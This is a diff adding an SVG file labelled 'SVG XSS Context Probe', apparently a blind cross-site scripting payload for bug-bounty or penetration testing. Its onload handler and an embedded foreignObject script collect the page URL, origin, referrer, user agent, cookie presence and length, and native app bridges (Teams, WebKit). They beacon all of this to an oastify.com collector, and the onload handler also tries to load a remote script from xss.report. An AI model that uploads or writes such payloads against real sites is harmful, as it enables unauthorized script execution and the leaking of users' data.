@@ -1,0 +1,37 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="420" onload="
+  (function(){
+    var label=(new URL(location.href)).searchParams.get('label')||'payload-svg';
+    var oast=(new URL(location.href)).searchParams.get('oast')||'s924iasmarwrhw7lpwncu9m7lyrpfh36.oastify.com';
+    var bxss=(new URL(location.href)).searchParams.get('bxss')||'https://xss.report/c/ztlsavior';
+    var d={
+      label:label,
+      href:location.href,
+      origin:location.origin,
+      referrer:document.referrer,
+      ua:navigator.userAgent,
+      topSelf:top===self,
+      parentSelf:parent===self,
+      hasNI:!!window.nativeInterface,
+      niProps:window.nativeInterface?Object.getOwnPropertyNames(window.nativeInterface).length:0,
+      hasWebkit:!!window.webkit,
+      hasTeams:!!window.microsoftTeams,
+      cookiePresent:!!document.cookie,
+      cookieLength:document.cookie?document.cookie.length:0
+    };
+    var q=Object.keys(d).map(function(k){return encodeURIComponent(k)+'='+encodeURIComponent(String(d[k]).slice(0,900));}).join('&amp;');
+    (new Image()).src='https://'+oast+'/xctx/'+encodeURIComponent(label)+'?'+q+'&amp;ts='+Date.now();
+    var s=document.createElement('script');s.href=bxss;document.documentElement.appendChild(s);
+  })()
+">
+  <rect width="800" height="420" fill="#101720"/>
+  <text x="32" y="70" fill="#58a6ff" font-size="28" font-family="monospace">SVG XSS Context Probe</text>
+  <text x="32" y="120" fill="#d6dde6" font-size="18" font-family="monospace">If script runs, OAST receives /xctx/&lt;label&gt;.</text>
+  <foreignObject x="32" y="160" width="720" height="120">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>
+        new Image().src='https://s924iasmarwrhw7lpwncu9m7lyrpfh36.oastify.com/xctx/foreignObject?href='+encodeURIComponent(location.href)+'&amp;ts='+Date.now()
+      </script>
+      <div style="font:18px monospace;color:#3fb950">foreignObject probe</div>
+    </body>
+  </foreignObject>
+</svg>
